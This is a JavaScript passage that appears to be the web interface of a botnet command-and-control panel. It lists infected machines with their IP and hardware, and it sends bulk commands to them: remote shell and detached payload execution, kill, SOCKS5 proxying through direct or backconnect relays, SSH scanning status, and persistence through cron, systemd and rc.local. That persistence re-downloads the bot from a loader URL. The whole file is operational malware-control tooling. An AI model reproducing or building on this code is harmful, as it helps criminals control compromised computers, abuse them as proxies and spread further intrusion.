  if (drPing && drPing._lastPing) drPing.textContent = ago(drPing._lastPing);
  var isbPing = document.getElementById('isb-ping');
  if (isbPing && shellBotID && botState[shellBotID]) isbPing.textContent = ago(botState[shellBotID].lastPing);
}, 1000);

function updateBotCount() {
  var count = botOrder.length;
  var el = document.getElementById('tab-bots-count');
  if (el) el.textContent = count;
  if (count === 0) {
    var tbody = document.getElementById('bot-tbody');
    if (!tbody.querySelector('tr')) {
      tbody.innerHTML = '<tr><td colspan="14" class="no-bots">No bots connected</td></tr>';
    }
  }
}

function createBotRow(b) {
  var tr = document.createElement('tr');
  tr.className = 'bot-row';
  tr.id = 'bot-' + sanitizeId(b.botID);
  tr.setAttribute('data-botid', b.botID);
  tr.oncontextmenu = function (ev) { ev.preventDefault(); if (ev.target.type === 'checkbox') return; pinBotPopup(ev, b.botID); };
  tr.onclick = function (ev) { if (ev.target.type === 'checkbox' || ev.target.closest('.bot-id-link')) return; openDrawer(b.botID); };
  tr.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };

  var socksHtml = b.socksActive
    ? '<span class="socks-badge socks-on"><span class="socks-dot"></span>ON</span>'
    : '<span class="socks-badge socks-off"><span class="socks-dot"></span>OFF</span>';
  if (b.sshScanning) socksHtml += ' <span class="socks-badge socks-on" style="background:var(--accent,#6e40c9)">SSH</span>';
  var checked = selectedBots[b.botID] ? ' checked' : '';

  var h = botHealth(b.lastPing);
  tr.className = 'bot-row ' + h.row;

  var eid = b.botID.replace(/'/g, "\\'");
  var hitBadge = b.totalHits > 0 ? ' <span style="background:var(--green);color:#fff;padding:0 5px;border-radius:8px;font-size:10px;font-weight:700;margin-left:4px">' + b.totalHits + '</span>' : '';
  var capTags = botCapTags(b);
  var scanBadge = '';
  if (b.scanningType) {
    var pct = b.scanBatchSize > 0 ? Math.round((b.scanBatchSize - b.scanBatchRemaining) / b.scanBatchSize * 100) : 0;
    scanBadge = '<span style="background:var(--accent,#6e40c9);color:#fff;padding:1px 6px;border-radius:8px;font-size:10px;font-weight:700">' +
      b.scanningType.toUpperCase() + ' ' + pct + '%</span>';
  }

  tr.innerHTML =
    '<td><input type="checkbox"' + checked + ' onchange="toggleBotSelect(\'' + eid + '\',this.checked)"></td>' +
    '<td><span class="bot-id-link" onclick="event.stopPropagation();openDrawer(\'' + eid + '\')" title="Click for bot details">' + escHtml(b.botID) + '</span>' + capTags + hitBadge + '</td>' +
    '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
    '<td><span class="country-badge" title="' + escHtml(b.country) + '">' + countryFlag(b.country) + '</span></td>' +
    '<td>' + groupTagHtml(b.group) + '</td>' +
    '<td>' + escHtml(b.arch) + '</td>' +
    '<td>' + formatRAM(b.ram) + '</td>' +
    '<td>' + b.cpuCores + '</td>' +
    '<td>' + originBadge(b.origin) + '</td>' +
    '<td>' + escHtml(b.processName) + '</td>' +
    '<td>' + socksHtml + '</td>' +
    '<td>' + scanBadge + '</td>' +
    '<td>' + escHtml(b.uptime) + '</td>' +
    '<td class="' + h.cls + '"><span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing) + '</td>';
  return tr;
}

function updateBotRow(row, b) {
  var cells = row.getElementsByTagName('td');
  if (cells.length < 14) return;
  var socksHtml = b.socksActive
    ? '<span class="socks-badge socks-on"><span class="socks-dot"></span>ON</span>'
    : '<span class="socks-badge socks-off"><span class="socks-dot"></span>OFF</span>';
  if (b.sshScanning) socksHtml += ' <span class="socks-badge socks-on" style="background:var(--accent,#6e40c9)">SSH</span>';
  var hitBadge = b.totalHits > 0 ? ' <span style="background:var(--green);color:#fff;padding:0 5px;border-radius:8px;font-size:10px;font-weight:700;margin-left:4px">' + b.totalHits + '</span>' : '';
  var scanBadge = '';
  if (b.scanningType) {
    var pct = b.scanBatchSize > 0 ? Math.round((b.scanBatchSize - b.scanBatchRemaining) / b.scanBatchSize * 100) : 0;
    scanBadge = '<span style="background:var(--accent,#6e40c9);color:#fff;padding:1px 6px;border-radius:8px;font-size:10px;font-weight:700">' +
      b.scanningType.toUpperCase() + ' ' + pct + '%</span>';
  }
  // 0=cb 1=id 2=ip 3=country 4=group 5=arch 6=ram 7=cpu 8=origin 9=process 10=socks 11=scanner 12=uptime 13=ping
  var eid = b.botID.replace(/'/g, "\\'");
  var capTags = botCapTags(b);
  cells[1].innerHTML = '<span class="bot-id-link" onclick="event.stopPropagation();openDrawer(\'' + eid + '\')" title="Click for bot details">' + escHtml(b.botID) + '</span>' + capTags + hitBadge;
  cells[4].innerHTML = groupTagHtml(b.group);
  cells[6].textContent = formatRAM(b.ram);
  cells[7].textContent = b.cpuCores;
  cells[8].innerHTML = originBadge(b.origin);
  cells[9].textContent = b.processName;
  cells[10].innerHTML = socksHtml;
  cells[11].innerHTML = scanBadge;
  cells[12].textContent = b.uptime;
  var h = botHealth(b.lastPing);
  cells[13].className = h.cls;
  cells[13].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
  row.className = 'bot-row ' + h.row;
  row.oncontextmenu = function (ev) { ev.preventDefault(); if (ev.target.type === 'checkbox') return; pinBotPopup(ev, b.botID); };
  row.ondblclick = function (ev) { if (ev.target.type === 'checkbox') return; openShell(b.botID); };
}

// ---------------------------------------------------------------------------
// Multi-select
// ---------------------------------------------------------------------------

function toggleBotSelect(botID, checked) {
  if (checked) selectedBots[botID] = true;
  else delete selectedBots[botID];
  updateMultiSelectBar();
}

function toggleSelectAll(checked) {
  var rows = document.querySelectorAll('#bot-tbody tr.bot-row');
  rows.forEach(function (r) {
    if (r.style.display === 'none') return;
    var cb = r.querySelector('input[type=checkbox]');
    var id = r.getAttribute('data-botid');
    if (cb) { cb.checked = checked; }
    if (checked) selectedBots[id] = true;
    else delete selectedBots[id];
  });
  updateMultiSelectBar();
}

function updateMultiSelectBar() {
  var count = Object.keys(selectedBots).length;
  var bar = document.getElementById('multi-select-bar');
  bar.style.display = count > 0 ? 'flex' : 'none';
  document.getElementById('ms-count').textContent = count + ' selected';
}

function msCmd(cmd) {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  ids.forEach(function (id) { popupCmd(id, cmd); });
  showToast('Sent ' + cmd + ' to ' + ids.length + ' bots', true);
}

function msKill() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  if (!confirm('Kill ' + ids.length + ' bots? This cannot be undone.')) return;
  ids.forEach(function (id) { popupCmd(id, '!kill'); });
  selectedBots = {};
  updateMultiSelectBar();
}

function msOpenShells() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  // Open first shell, add others as tabs
  openShell(ids[0]);
  for (var i = 1; i < ids.length && i < 8; i++) {
    addShellTab(ids[i]);
  }
}

function msStartSocks() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  // Reuse the socks modal but target all selected bots
  var old = document.getElementById('socks-modal-overlay');
  if (old) old.remove();

  var defUser = typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : 'admin';
  var defPass = typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : 'admin';

  var overlay = document.createElement('div');
  overlay.id = 'socks-modal-overlay';
  overlay.className = 'socks-modal-overlay';
  overlay.setAttribute('data-bot', '__multi__');
  overlay.innerHTML =
    '<div class="socks-modal">' +
    '<div class="socks-modal-title">Start SOCKS5 on ' + ids.length + ' bots</div>' +
    '<div class="cmd-args">' +
    '<div class="cmd-group">' +
    '<label>Mode</label>' +
    '<select id="socks-m-mode" onchange="socksModalModeChange()">' +
    '<option value="direct">Direct (listen on bot)</option>' +
    '<option value="relay">Relay (backconnect)</option>' +
    '</select>' +
    '</div>' +
    '<div class="cmd-group" id="socks-m-port-row">' +
    '<label>Listen Port</label>' +
    '<input type="text" id="socks-m-port" value="1080" placeholder="1080">' +
    '</div>' +
    '<div class="cmd-group" id="socks-m-relay-row" style="display:none">' +
    '<label>Relay</label>' +
    '<select id="socks-m-relay"><option value="">Loading...</option></select>' +
    '</div>' +
    '<div class="cmd-group">' +
    '<label>Username (optional)</label>' +
    '<input type="text" id="socks-m-user" value="' + escHtml(defUser) + '" placeholder="username">' +
    '</div>' +
    '<div class="cmd-group">' +
    '<label>Password (optional)</label>' +
    '<input type="password" id="socks-m-pass" value="' + escHtml(defPass) + '" placeholder="password">' +
    '</div>' +
    '</div>' +
    '<div class="socks-modal-btns">' +
    '<button class="socks-modal-btn socks-modal-cancel" onclick="closeSocksModal()">Cancel</button>' +
    '<button class="socks-modal-btn socks-modal-start" onclick="msSubmitSocksModal()">Start</button>' +
    '</div>' +
    '</div>';
  document.body.appendChild(overlay);
  overlay.addEventListener('click', function (e) { if (e.target === overlay) closeSocksModal(); });
  populateRelayDropdown();
  requestAnimationFrame(function () { overlay.classList.add('open'); });
}

function msSubmitSocksModal() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) { closeSocksModal(); return; }
  var mode = document.getElementById('socks-m-mode').value;
  var user = (document.getElementById('socks-m-user') || {}).value || '';
  var pass = (document.getElementById('socks-m-pass') || {}).value || '';
  var socksArg;
  if (mode === 'relay') {
    socksArg = (document.getElementById('socks-m-relay') || {}).value;
    if (!socksArg) { showToast('No relay selected', false); return; }
  } else {
    socksArg = (document.getElementById('socks-m-port') || {}).value || '1080';
  }
  ids.forEach(function (id) {
    popupCmd(id, '!socks ' + socksArg);
    if (user && pass) popupCmd(id, '!socksauth ' + user + ' ' + pass);
  });
  showToast('Started SOCKS on ' + ids.length + ' bots', true);
  closeSocksModal();
}

function msUpdateFetch() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  var old = document.getElementById('updatefetch-modal-overlay');
  if (old) old.remove();

  var overlay = document.createElement('div');
  overlay.id = 'updatefetch-modal-overlay';
  overlay.className = 'socks-modal-overlay';
  overlay.innerHTML =
    '<div class="socks-modal">' +
    '<div class="socks-modal-title">Update Fetch URL on ' + ids.length + ' bots</div>' +
    '<div class="cmd-args">' +
    '<div class="cmd-group">' +
    '<label>New Fetch URL</label>' +
    '<input type="text" id="uf-url" placeholder="http://host/bins/" style="width:100%">' +
    '</div>' +
    '</div>' +
    '<div class="socks-modal-btns">' +
    '<button class="socks-modal-btn socks-modal-cancel" onclick="closeUpdateFetchModal()">Cancel</button>' +
    '<button class="socks-modal-btn socks-modal-start" onclick="msSubmitUpdateFetch()">Update</button>' +
    '</div>' +
    '</div>';
  document.body.appendChild(overlay);
  overlay.addEventListener('click', function (e) { if (e.target === overlay) closeUpdateFetchModal(); });
  requestAnimationFrame(function () { overlay.classList.add('open'); });
  setTimeout(function () { var el = document.getElementById('uf-url'); if (el) el.focus(); }, 200);
}

function closeUpdateFetchModal() {
  var el = document.getElementById('updatefetch-modal-overlay');
  if (el) { el.classList.remove('open'); setTimeout(function () { el.remove(); }, 200); }
}

function msSubmitUpdateFetch() {
  var ids = Object.keys(selectedBots);
  var url = (document.getElementById('uf-url') || {}).value || '';
  if (!url) { showToast('Please enter a fetch URL', false); return; }
  if (!confirm('Update fetch URL and rewrite persistence on ' + ids.length + ' bots?')) return;
  ids.forEach(function (id) { popupCmd(id, '!updatefetch ' + url); });
  showToast('Sent !updatefetch to ' + ids.length + ' bots', true);
  closeUpdateFetchModal();
}

// ---------------------------------------------------------------------------
// Group Assignment
// ---------------------------------------------------------------------------

function showGroupPicker(botIDs, anchorEl) {
  // Remove existing picker
  var old = document.getElementById('group-picker-overlay');
  if (old) old.remove();

  // Fetch existing groups for autocomplete
  fetch('/api/groups').then(function (r) { return r.json(); }).then(function (groups) {
    var opts = (groups || []).map(function (g) {
      return '<option value="' + escHtml(g) + '">' + escHtml(g) + '</option>';
    }).join('');

    var d = document.createElement('div');
    d.id = 'group-picker-overlay';
    d.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center';
    d.innerHTML = '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;padding:20px;min-width:340px">' +
      '<div style="font-size:14px;font-weight:600;margin-bottom:12px;color:var(--text)">Set Group for ' + botIDs.length + ' bot' + (botIDs.length > 1 ? 's' : '') + '</div>' +
      '<div style="margin-bottom:12px">' +
      '<input type="text" id="group-pick-input" list="group-pick-list" placeholder="Type group name or select..." style="width:100%;padding:8px;background:var(--bg-primary);border:1px solid var(--border);color:var(--text);border-radius:4px;font-size:13px">' +
      '<datalist id="group-pick-list">' + opts + '</datalist>' +
      '</div>' +
      '<div style="display:flex;gap:8px;justify-content:flex-end">' +
      '<button id="group-pick-remove" style="padding:6px 16px;background:var(--red-dim);border:1px solid var(--red);color:var(--red);border-radius:4px;cursor:pointer;font-size:12px;font-weight:600">Remove Group</button>' +
      '<button id="group-pick-cancel" style="padding:6px 16px;background:var(--bg-elevated);border:1px solid var(--border);color:var(--text);border-radius:4px;cursor:pointer">Cancel</button>' +
      '<button id="group-pick-ok" style="padding:6px 16px;background:var(--accent);border:none;color:#fff;border-radius:4px;cursor:pointer;font-weight:600">Apply</button>' +
      '</div></div>';
    document.body.appendChild(d);
    d.addEventListener('click', function (e) { if (e.target === d) d.remove(); });
    document.getElementById('group-pick-cancel').onclick = function () { d.remove(); };
    document.getElementById('group-pick-ok').onclick = function () {
      var val = document.getElementById('group-pick-input').value.trim();
      if (!val) { return; }
      applyGroup(botIDs, val);
      d.remove();
    };
    document.getElementById('group-pick-remove').onclick = function () {
      applyGroup(botIDs, '');
      d.remove();
    };
    document.getElementById('group-pick-input').focus();
    document.getElementById('group-pick-input').addEventListener('keydown', function (e) {
      if (e.key === 'Enter') { document.getElementById('group-pick-ok').click(); }
      if (e.key === 'Escape') { d.remove(); }
    });
  }).catch(function () {
    var val = prompt('Enter group name (empty to remove):');
    if (val === null) return;
    applyGroup(botIDs, val.trim());
  });
}

function applyGroup(botIDs, group) {
  fetch('/api/group', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ botIDs: botIDs, group: group })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      showToast(d.message, d.success);
      // Update local state immediately
      botIDs.forEach(function (id) {
        if (botState[id]) { botState[id].group = group; }
      });
      window._bots = botState;
      window._botsArr = botOrder.map(function (id) { return botState[id]; }).filter(Boolean);
      // Re-render affected rows
      botIDs.forEach(function (id) {
        var row = document.getElementById('bot-' + sanitizeId(id));
        if (row && botState[id]) updateBotRow(row, botState[id]);
      });
      lastFilterHash = '';
      buildFilterPanel();
      filterBotTable();
    })
    .catch(function () { showToast('Group request failed', false); });
}

function msSetGroup() {
  var ids = Object.keys(selectedBots);
  if (!ids.length) return;
  showGroupPicker(ids);
}

function popupSetGroup(botID) {
  showGroupPicker([botID]);
}

// ---------------------------------------------------------------------------
// Filter Panel
// ---------------------------------------------------------------------------

var activeFilters = { group: {}, arch: {}, country: {}, socks: {}, ram: {}, cpu: {} };
var lastFilterHash = '';

function buildFilterPanel() {
  if (!window._botsArr || !window._botsArr.length) return;
  var bots = window._botsArr;

  // Collect unique values
  var groups = {}, archs = {}, countries = {}, socks = { 'ON': 0, 'OFF': 0 };
  var ramRanges = { '< 1GB': 0, '1-4GB': 0, '4-16GB': 0, '16GB+': 0 };
  var cpuRanges = { '1 core': 0, '2-4 cores': 0, '4+ cores': 0 };

  bots.forEach(function (b) {
    var gk = b.group || '(ungrouped)';
    groups[gk] = (groups[gk] || 0) + 1;
    archs[b.arch] = (archs[b.arch] || 0) + 1;
    countries[b.country] = (countries[b.country] || 0) + 1;
    if (b.socksActive) socks['ON']++; else socks['OFF']++;
    if (b.ram < 1024) ramRanges['< 1GB']++;
    else if (b.ram < 4096) ramRanges['1-4GB']++;
    else if (b.ram < 16384) ramRanges['4-16GB']++;
    else ramRanges['16GB+']++;
    if (b.cpuCores <= 1) cpuRanges['1 core']++;
    else if (b.cpuCores <= 4) cpuRanges['2-4 cores']++;
    else cpuRanges['4+ cores']++;
  });

  var hash = JSON.stringify([groups, archs, countries, socks, ramRanges, cpuRanges]);
  if (hash === lastFilterHash) return;
  lastFilterHash = hash;

  var wrap = document.getElementById('filter-groups');
  wrap.innerHTML = '';

  function makeGroup(label, key, items) {
    var g = document.createElement('div'); g.className = 'filter-group';
    g.innerHTML = '<span class="filter-group-label">' + label + '</span>';
    var chips = document.createElement('div'); chips.className = 'filter-chips';
    Object.entries(items).forEach(function (e) {
      var val = e[0], cnt = e[1];
      var chip = document.createElement('label');
      chip.className = 'filter-chip' + (activeFilters[key][val] ? ' active' : '');
      chip.innerHTML = '<span class="filter-chip-dot"></span><input type="checkbox"' +
        (activeFilters[key][val] ? ' checked' : '') + '> ' + escHtml(val) + ' <span style="color:var(--text-dim)">(' + cnt + ')</span>';
      chip.onclick = function () {
        var cb = chip.querySelector('input');
        cb.checked = !cb.checked;
        if (cb.checked) { activeFilters[key][val] = true; chip.classList.add('active'); }
        else { delete activeFilters[key][val]; chip.classList.remove('active'); }
        filterBotTable();
      };
      chips.appendChild(chip);
    });
    g.appendChild(chips);
    wrap.appendChild(g);
  }

  if (Object.keys(groups).length > 1 || (Object.keys(groups).length === 1 && !groups['(ungrouped)'])) {
    makeGroup('Group', 'group', groups);
  }
  makeGroup('Arch', 'arch', archs);
  makeGroup('Country', 'country', countries);
  makeGroup('SOCKS', 'socks', socks);
  makeGroup('RAM', 'ram', ramRanges);
  makeGroup('CPU', 'cpu', cpuRanges);
}

function clearAllFilters() {
  activeFilters = { group: {}, arch: {}, country: {}, socks: {}, ram: {}, cpu: {} };
  document.getElementById('bot-search').value = '';
  lastFilterHash = '';
  lsDel('filters');
  lsDel('search');
  buildFilterPanel();
  filterBotTable();
}

function hasActiveFilters() {
  for (var k in activeFilters) {
    if (Object.keys(activeFilters[k]).length > 0) return true;
  }
  return false;
}

function botMatchesFilters(b) {
  if (Object.keys(activeFilters.group).length) {
    var gk = b.group || '(ungrouped)';
    if (!activeFilters.group[gk]) return false;
  }
  if (Object.keys(activeFilters.arch).length && !activeFilters.arch[b.arch]) return false;
  if (Object.keys(activeFilters.country).length && !activeFilters.country[b.country]) return false;
  if (Object.keys(activeFilters.socks).length) {
    var st = b.socksActive ? 'ON' : 'OFF';
    if (!activeFilters.socks[st]) return false;
  }
  if (Object.keys(activeFilters.ram).length) {
    var rk;
    if (b.ram < 1024) rk = '< 1GB';
    else if (b.ram < 4096) rk = '1-4GB';
    else if (b.ram < 16384) rk = '4-16GB';
    else rk = '16GB+';
    if (!activeFilters.ram[rk]) return false;
  }
  if (Object.keys(activeFilters.cpu).length) {
    var ck;
    if (b.cpuCores <= 1) ck = '1 core';
    else if (b.cpuCores <= 4) ck = '2-4 cores';
    else ck = '4+ cores';
    if (!activeFilters.cpu[ck]) return false;
  }
  return true;
}

// ---------------------------------------------------------------------------
// Bot search / filter (enhanced with filter panel)
// ---------------------------------------------------------------------------

function filterBotTable() {
  var q = (document.getElementById('bot-search').value || '').toLowerCase();
  lsSet('search', q);
  lsSet('filters', activeFilters);
  var rows = document.querySelectorAll('#bot-tbody tr.bot-row');
  var shown = 0, total = rows.length;
  var useFilters = hasActiveFilters();

  rows.forEach(function (r) {
    var id = r.getAttribute('data-botid');
    var b = botState[id];
    var textMatch = !q || r.textContent.toLowerCase().indexOf(q) !== -1;
    var filterMatch = !useFilters || (b && botMatchesFilters(b));
    if (textMatch && filterMatch) { r.style.display = ''; shown++; }
    else { r.style.display = 'none'; }
  });

  var sc = document.getElementById('search-count');
  if (q || useFilters) { sc.textContent = shown + '/' + total + ' shown'; }
  else { sc.textContent = ''; }
}

// ---------------------------------------------------------------------------
// CSV Export
// ---------------------------------------------------------------------------

function exportBotsCSV() {
  var rows = document.querySelectorAll('#bot-tbody tr.bot-row');
  var cols = ['Bot ID', 'IP', 'Country', 'Group', 'Arch', 'RAM (MB)', 'CPU', 'Origin', 'Process', 'SOCKS', 'Uptime', 'Last Ping'];
  var csv = [cols.join(',')];
  rows.forEach(function (r) {
    if (r.style.display === 'none') return;
    var id = r.getAttribute('data-botid');
    var b = botState[id];
    if (!b) return;
    csv.push([
      '"' + (b.botID || '').replace(/"/g, '""') + '"',
      b.ip || '',
      b.country || '',
      '"' + (b.group || '').replace(/"/g, '""') + '"',
      b.arch || '',
      b.ram || 0,
      b.cpuCores || 0,
      '"' + (b.origin || '').replace(/"/g, '""') + '"',
      '"' + (b.processName || '').replace(/"/g, '""') + '"',
      b.socksActive ? 'ON' : 'OFF',
      '"' + (b.uptime || '') + '"',
      b.lastPing || ''
    ].join(','));
  });
  var blob = new Blob([csv.join('\n')], { type: 'text/csv' });
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'bots_' + new Date().toISOString().slice(0, 10) + '.csv';
  a.click();
  URL.revokeObjectURL(a.href);
  showToast('Exported ' + (csv.length - 1) + ' bots to CSV', true);
}

// ---------------------------------------------------------------------------
// Bot Info Popup
// ---------------------------------------------------------------------------

var popupPinned = false, popupBotID = '';

function fillPopup(b) {
  _lastPopupBot = b;
  document.getElementById('popup-botid').textContent = b.botID;
  document.getElementById('popup-country').textContent = b.country;
  document.getElementById('popup-ip').textContent = b.ip;
  document.getElementById('popup-arch').textContent = b.arch;
  document.getElementById('popup-ram').textContent = formatRAM(b.ram);
  document.getElementById('popup-cpu').textContent = b.cpuCores + ' cores';
  document.getElementById('popup-proc').textContent = b.processName;
  document.getElementById('popup-uptime').textContent = b.uptime;
  var _popPingEl = document.getElementById('popup-ping');
  _popPingEl.textContent = ago(b.lastPing);
  _popPingEl._lastPing = b.lastPing;

  var ss = document.getElementById('popup-socks-status');
  if (b.socksActive) {
    ss.innerHTML = '<span class="popup-socks-active">ONLINE</span>';
    document.getElementById('popup-socks-relay-row').style.display = '';
    document.getElementById('popup-socks-relay').textContent = b.socksRelay || '-';
    document.getElementById('popup-socks-auth-row').style.display = b.socksUser ? '' : 'none';
    if (b.socksUser) document.getElementById('popup-socks-user').textContent = b.socksUser;
    document.getElementById('popup-socks-since-row').style.display = b.socksStarted ? '' : 'none';
    if (b.socksStarted) document.getElementById('popup-socks-since').textContent = ago(b.socksStarted);
  } else {
    ss.innerHTML = '<span class="popup-socks-inactive">OFFLINE</span>';
    document.getElementById('popup-socks-relay-row').style.display = 'none';
    document.getElementById('popup-socks-auth-row').style.display = 'none';
    document.getElementById('popup-socks-since-row').style.display = 'none';
  }

  var acts = document.getElementById('popup-actions');
  var id = b.botID.replace(/'/g, "\\'");
  var html = '<button class="popup-act act-group" onclick="popupSetGroup(\'' + id + '\')">' + (b.group ? 'Group: ' + escHtml(b.group) : 'Set Group') + '</button>';
  html += '<button class="popup-act act-shell" onclick="closeBotPopup();openShell(\'' + id + '\')">Shell</button>';
  if (b.socksActive) {
    html += '<button class="popup-act act-stopsocks" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')">Stop SOCKS</button>';
  } else {
    html += '<button class="popup-act act-socks" onclick="popupStartSocks(\'' + id + '\')">Start SOCKS</button>';
  }
  html += '<button class="popup-act act-kill" onclick="popupKill(\'' + id + '\')">Kill</button>';
  acts.innerHTML = html;
  rbacFilterActions();
}

function positionPopup(ev) {
  var p = document.getElementById('bot-popup');
  p.classList.add('visible');
  var pw = p.offsetWidth, ph = p.offsetHeight;
  var left = ev.clientX + 12, top = ev.clientY - ph / 2;
  if (left + pw > window.innerWidth) left = ev.clientX - pw - 12;
  if (top + ph > window.innerHeight) top = window.innerHeight - ph - 8;
  if (top < 8) top = 8;
  p.style.left = left + 'px'; p.style.top = top + 'px';
}

function pinBotPopup(ev, botID) {
  ev.stopPropagation();
  var b = window._bots && window._bots[botID]; if (!b) return;
  popupPinned = true; popupBotID = botID; fillPopup(b); positionPopup(ev);
}
function closeBotPopup() { popupPinned = false; popupBotID = ''; document.getElementById('bot-popup').classList.remove('visible'); }

document.addEventListener('click', function (e) {
  if (!popupPinned) return;
  var p = document.getElementById('bot-popup');
  if (!p.contains(e.target) && !e.target.closest('.bot-row')) { closeBotPopup(); }
});

// ---------------------------------------------------------------------------
// Popup commands
// ---------------------------------------------------------------------------

function popupCmd(botID, cmd) {
  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd, botID: botID }) })
    .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
    .catch(function () { showToast('Request failed', false); });
}

function popupKill(botID) {
  if (!confirm('Kill bot ' + botID + '? This cannot be undone.')) return;
  popupCmd(botID, '!kill'); closeBotPopup();
}

function popupStartSocks(botID) {
  // Remove existing modal if any
  var old = document.getElementById('socks-modal-overlay');
  if (old) old.remove();

  var defUser = typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : 'admin';
  var defPass = typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : 'admin';

  var overlay = document.createElement('div');
  overlay.id = 'socks-modal-overlay';
  overlay.className = 'socks-modal-overlay';
  overlay.innerHTML =
    '<div class="socks-modal">' +
    '<div class="socks-modal-title">Start SOCKS5 Proxy</div>' +
    '<div class="cmd-args">' +
    '<div class="cmd-group">' +
    '<label>Mode</label>' +
    '<select id="socks-m-mode" onchange="socksModalModeChange()">' +
    '<option value="direct">Direct (listen on bot)</option>' +
    '<option value="relay">Relay (backconnect)</option>' +
    '</select>' +
    '</div>' +
    '<div class="cmd-group" id="socks-m-port-row">' +
    '<label>Listen Port</label>' +
    '<input type="text" id="socks-m-port" value="1080" placeholder="1080">' +
    '</div>' +
    '<div class="cmd-group" id="socks-m-relay-row" style="display:none">' +
    '<label>Relay</label>' +
    '<select id="socks-m-relay"><option value="">Loading...</option></select>' +
    '</div>' +
    '<div class="cmd-group">' +
    '<label>Username (optional)</label>' +
    '<input type="text" id="socks-m-user" value="' + escHtml(defUser) + '" placeholder="username">' +
    '</div>' +
    '<div class="cmd-group">' +
    '<label>Password (optional)</label>' +
    '<input type="password" id="socks-m-pass" value="' + escHtml(defPass) + '" placeholder="password">' +
    '</div>' +
    '</div>' +
    '<div class="socks-modal-btns">' +
    '<button class="socks-modal-btn socks-modal-cancel" onclick="closeSocksModal()">Cancel</button>' +
    '<button class="socks-modal-btn socks-modal-start" onclick="submitSocksModal()">Start</button>' +
    '</div>' +
    '</div>';
  overlay.setAttribute('data-bot', botID);
  document.body.appendChild(overlay);

  // Close on overlay click
  overlay.addEventListener('click', function (e) {
    if (e.target === overlay) closeSocksModal();
  });

  // Fetch relays for dropdown
  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
    var sel = document.getElementById('socks-m-relay');
    if (!sel) return;
    sel.innerHTML = '';
    if (!relays || !relays.length) {
      sel.innerHTML = '<option value="">No relays configured</option>';
      return;
    }
    relays.forEach(function (r) {
      var opt = document.createElement('option');
      opt.value = r.host + ':' + r.controlPort;
      opt.textContent = r.name + ' (' + r.host + ':' + r.controlPort + ')';
      sel.appendChild(opt);
    });
  }).catch(function () {
    var sel = document.getElementById('socks-m-relay');
    if (sel) sel.innerHTML = '<option value="">Failed to load relays</option>';
  });

  requestAnimationFrame(function () { overlay.classList.add('open'); });
}

function socksModalModeChange() {
  var mode = document.getElementById('socks-m-mode').value;
  document.getElementById('socks-m-port-row').style.display = mode === 'direct' ? '' : 'none';
  document.getElementById('socks-m-relay-row').style.display = mode === 'relay' ? '' : 'none';
}

function closeSocksModal() {
  var el = document.getElementById('socks-modal-overlay');
  if (el) { el.classList.remove('open'); setTimeout(function () { el.remove(); }, 200); }
}

function submitSocksModal() {
  var overlay = document.getElementById('socks-modal-overlay');
  if (!overlay) return;
  var botID = overlay.getAttribute('data-bot');
  var mode = document.getElementById('socks-m-mode').value;
  var user = (document.getElementById('socks-m-user') || {}).value || '';
  var pass = (document.getElementById('socks-m-pass') || {}).value || '';

  if (mode === 'relay') {
    var relay = (document.getElementById('socks-m-relay') || {}).value;
    if (!relay) { showToast('No relay selected', false); return; }
    popupCmd(botID, '!socks ' + relay);
  } else {
    var port = (document.getElementById('socks-m-port') || {}).value || '1080';
    popupCmd(botID, '!socks ' + port);
  }
  if (user && pass) popupCmd(botID, '!socksauth ' + user + ' ' + pass);
  closeSocksModal();
}

// ---------------------------------------------------------------------------
// Command Center
// ---------------------------------------------------------------------------

var cmdArgDefs = {
  '!shell': [{ id: 'arg-shell-cmd', label: 'Command', placeholder: 'e.g. whoami, ls -la, cat /etc/passwd' }],
  '!detach': [{ id: 'arg-detach-cmd', label: 'Command', placeholder: 'e.g. nohup ./payload &' }],
  '!socks': [
    {
      id: 'arg-socks-mode', label: 'Mode', type: 'select', options: [
        { v: 'direct', t: 'Direct (listen on bot)' },
        { v: 'relay', t: 'Relay (backconnect)' }
      ]
    },
    { id: 'arg-socks-port', label: 'Listen Port', placeholder: 'e.g. 1080 (default)', showWhen: { field: 'arg-socks-mode', val: 'direct' } },
    { id: 'arg-socks-relay', label: 'Relay', type: 'select', options: [], showWhen: { field: 'arg-socks-mode', val: 'relay' } },
    { id: 'arg-socks-user', label: 'Auth Username (optional)', placeholder: typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : '' },
    { id: 'arg-socks-pass', label: 'Auth Password (optional)', placeholder: typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : '', type: 'password' }
  ],
  '!stopsocks': [],
  '!socksauth': [
    { id: 'arg-sa-user', label: 'Username', placeholder: 'socks username' },
    { id: 'arg-sa-pass', label: 'Password', placeholder: 'socks password', type: 'password' }
  ],
  '!info': [], '!persist': [],
  '!updatefetch': [
    { id: 'arg-uf-url', label: 'Fetch URL', placeholder: 'e.g. http://bins.example.com/init.sh', tooltip: 'The loader script URL that persistence mechanisms (cron, systemd, rc.local) will use to re-download the bot if the binary is missing.' },
